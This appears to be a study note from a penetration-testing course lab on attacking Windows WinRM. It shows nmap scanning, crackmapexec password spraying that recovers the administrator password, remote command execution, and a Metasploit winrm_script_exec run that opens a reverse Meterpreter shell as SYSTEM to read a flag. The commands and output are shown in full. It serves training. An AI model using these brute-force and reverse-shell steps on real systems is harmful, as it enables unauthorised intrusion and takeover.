# Exploiting WinRM

What is WinRM? -> [WinRM](https://github.com/itr-a/eJTP-Learning/tree/947919a04ec85777840b057e63d28bacd0dfd327/What_is/WinRm.md)

#### Tools
- **crackmap**

```bash
└─# nmap -sV demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-16 10:52 IST
Nmap scan report for demo.ine.local (10.0.25.188)
Host is up (0.0035s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


# Specify port
nmap -sV -p 5985 10.0.25.188
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-16 10:55 IST
Nmap scan report for demo.ine.local (10.0.25.188)
Host is up (0.0026s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

└─# crackmapexec
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT]
                    [--jitter INTERVAL] [--darrell] [--verbose]
                    {rdp,ssh,mssql,ftp,ldap,winrm,smb} ...
~~~~

└─# crackmapexec winrm 10.0.25.188 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
~~~~~~
WINRM       10.0.25.188     5985   SERVER           [-] server\administrator:elizabeth
WINRM       10.0.25.188     5985   SERVER           [-] server\administrator:hottie
WINRM       10.0.25.188     5985   SERVER           [+] server\administrator:tinkerbell (Pwn3d!)


└─# crackmapexec winrm 10.0.25.188 -u administrator -p tinkerbell -x "whoami"
SMB         10.0.25.188     5985   SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:server)
HTTP        10.0.25.188     5985   SERVER           [*] http://10.0.25.188:5985/wsman
WINRM       10.0.25.188     5985   SERVER           [+] server\administrator:tinkerbell (Pwn3d!)
WINRM       10.0.25.188     5985   SERVER           [+] Executed command
WINRM       10.0.25.188     5985   SERVER           server\administrator


└─# crackmapexec winrm 10.0.25.188 -u administrator -p tinkerbell -x "systeminfo"
SMB         10.0.25.188     5985   SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:server)
HTTP        10.0.25.188     5985   SERVER           [*] http://10.0.25.188:5985/wsman
WINRM       10.0.25.188     5985   SERVER           [+] server\administrator:tinkerbell (Pwn3d!)
WINRM       10.0.25.188     5985   SERVER           [+] Executed command
WINRM       10.0.25.188     5985   SERVER           
Host Name:                 SERVER                                         
OS Name:                   Microsoft Windows Server 2019 Datacenter       
OS Version:                10.0.17763 N/A Build 17763                     
OS Manufacturer:           Microsoft Corporation                          
OS Configuration:          Standalone Server                              
OS Build Type:             Multiprocessor Free                            
Registered Owner:          EC2                                            
Registered Organization:   Amazon.com                                     
Product ID:                00430-00000-00000-AA975                        
Original Install Date:     10/1/2020, 2:03:19 PM                          
System Boot Time:          7/16/2025, 5:13:47 AM                          
System Manufacturer:       Xen                                            
System Model:              HVM domU                                       
System Type:               x64-based PC                                   
Processor(s):              1 Processor(s) Installed.                      
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz                                                        
BIOS Version:              Xen 4.11.amazon, 8/24/2006                     
Windows Directory:         C:\Windows                                     
System Directory:          C:\Windows\system32                            
Boot Device:               \Device\HarddiskVolume1                        
System Locale:             en-us;English (United States)          


└─# evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.0.25.188 

# Start Metasploit
msf6 > search winrm_script

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  exploit/windows/winrm/winrm_script_exec  2012-11-01       manual  No     WinRM Script Exec Remote Code Execution


msf6 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.0.25.188
RHOSTS => 10.0.25.188
#  Force the module to use the VBS
msf6 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
FORCE_VBS => true
msf6 exploit(windows/winrm/winrm_script_exec) > set USERNAME administratorUSERNAME => administrator
msf6 exploit(windows/winrm/winrm_script_exec) > set PASSWORD tinkerbell
PASSWORD => tinkerbell

msf6 exploit(windows/winrm/winrm_script_exec) > run

[*] Started reverse TCP handler on 10.10.38.2:4444 
[*] User selected the FORCE_VBS option
[*] Command Stager progress -   2.01% done (2046/101936 bytes)
[*] Command Stager progress -   4.01% done (4092/101936 bytes)
[*] Command Stager progress -   6.02% done (6138/101936 bytes)
[*] Command Stager progress -   8.03% done (8184/101936 bytes)
[*] Command Stager progress -  10.04% done (10230/101936 bytes)
[*] Command Stager progress -  12.04% done (12276/101936 bytes)
[*] Command Stager progress -  14.05% done (14322/101936 bytes)
[*] Command Stager progress -  16.06% done (16368/101936 bytes)
[*] Command Stager progress -  18.06% done (18414/101936 bytes)
[*] Command Stager progress -  20.07% done (20460/101936 bytes)
~~~
[*] Trying svchost.exe (896)
[+] Successfully migrated to svchost.exe (896) as: NT AUTHORITY\SYSTEM
[*] Meterpreter session 1 opened (10.10.38.2:4444 -> 10.0.25.188:49946) at 2025-07-16 11:20:51 +0530

meterpreter > 


meterpreter > cd ../../
meterpreter > ls
Listing: C:\
============

Mode          Size    Type  Last modified          Name
----          ----    ----  -------------          ----
040777/rwxrw  0       dir   2020-10-01 20:21:31 +  $Recycle.Bin
xrwx                        0530
100666/rw-rw  1       fil   2018-09-15 12:42:30 +  BOOTNXT
-rw-                        0530
040777/rwxrw  8192    dir   2020-09-09 10:08:52 +  Boot
xrwx                        0530
040777/rwxrw  0       dir   2018-11-14 21:40:15 +  Documents and Setting
xrwx                        0530                   s
040777/rwxrw  0       dir   2018-11-14 12:26:18 +  EFI
xrwx                        0530
040777/rwxrw  0       dir   2020-05-13 23:28:09 +  PerfLogs
xrwx                        0530
040555/r-xr-  4096    dir   2018-11-14 21:40:42 +  Program Files
xr-x                        0530
040777/rwxrw  4096    dir   2020-10-01 20:26:39 +  Program Files (x86)
xrwx                        0530
040777/rwxrw  4096    dir   2020-03-18 12:17:36 +  ProgramData
xrwx                        0530
040777/rwxrw  0       dir   2020-10-01 19:32:11 +  Recovery
xrwx                        0530
040777/rwxrw  4096    dir   2025-07-16 10:54:26 +  System Volume Informa
xrwx                        0530                   tion
040555/r-xr-  4096    dir   2020-10-01 19:33:57 +  Users
xr-x                        0530
040777/rwxrw  16384   dir   2020-10-01 19:32:06 +  Windows
xrwx                        0530
100444/r--r-  408692  fil   2020-09-09 10:03:42 +  bootmgr
-r--                        0530
100666/rw-rw  32      fil   2020-10-01 20:22:47 +  flag.txt
-rw-                        0530
000000/-----  0       fif   1970-01-01 05:30:00 +  pagefile.sys
----                        0530


meterpreter > cat flag.txt
3c716f95616eec677a7078f92657a230